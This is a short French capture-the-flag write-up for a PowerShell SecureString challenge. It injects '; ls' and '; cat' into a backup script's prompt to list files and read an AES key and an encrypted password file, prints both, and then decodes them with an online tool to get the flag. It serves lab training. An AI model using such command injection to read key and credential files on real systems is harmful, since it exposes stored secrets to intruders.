# Powershell - SecureString

## Procédure 

1. Utilisation d'une Powershell Command Injection

```
Table to dump:
> ; ls
Connect to the database With the secure Password: System.Security.SecureString.
Backup the table
-a----       12/12/2021   9:25 AM             43 .git
-a----       10/29/2020   9:27 AM            361 .passwd.crypt
------       12/12/2021   9:50 AM            748 ._perms
-a----       10/29/2020   9:23 AM            176 AES.key
-a----       10/29/2020   9:30 AM            331 ch19.ps1
```

Un fichier .key et un fichier .crypt sont disponibles

2. Ouverture des fichiers et sauvegarde de la clé et du mot de passe crypté

### Clé

```
> ; cat AES.key
Connect to the database With the secure Password: System.Security.SecureString.
Backup the table
3 4 2 3 56 34 254 222 1 1 2 23 42 54 33 233 1 34 2 7 6 5 35 43
```

### Mot de passe crypté

```
> ; cat .passwd.crypt
Connect to the database With the secure Password: System.Security.SecureString.
Backup the table
76492d1116743f0423413b16050a5345MgB8AEkAMQBwAEwAbgBoAHgARwBXAHkAMgB3AGcAdwB3AHQA
RQBqAEEARQBPAEEAPQA9AHwAMgAyAGMANQA1ADIANwBiADEANQA4ADIANwAwAGIANAA2ADIAMQBlADAA
NwA3ADIAYgBkADYANgAyADUAYwAyAGMAYQBhAGUAMAA5ADUAMAA2ADUAYQBjADIAMQAzADIAMgA1AGYA
NgBkAGYAYgAxAGMAMgAwADUANQBkADIAMgA0AGQAYgBmADYAMQA4AGQAZgBkAGQAMwAwADUANAA4AGYA
MAAyADgAZAAwADEAMgBmAGEAZQBmADgANAAyADkA
```

4. Recherche d'un site pour cracker clé System.Security.SecureString 

Ce site fait l'affaire : https://www.wietzebeukema.nl/powershell-securestring-decoder/

Une fois la clé et le mot de passe crypté rentré dans les blocs le flag apparaît.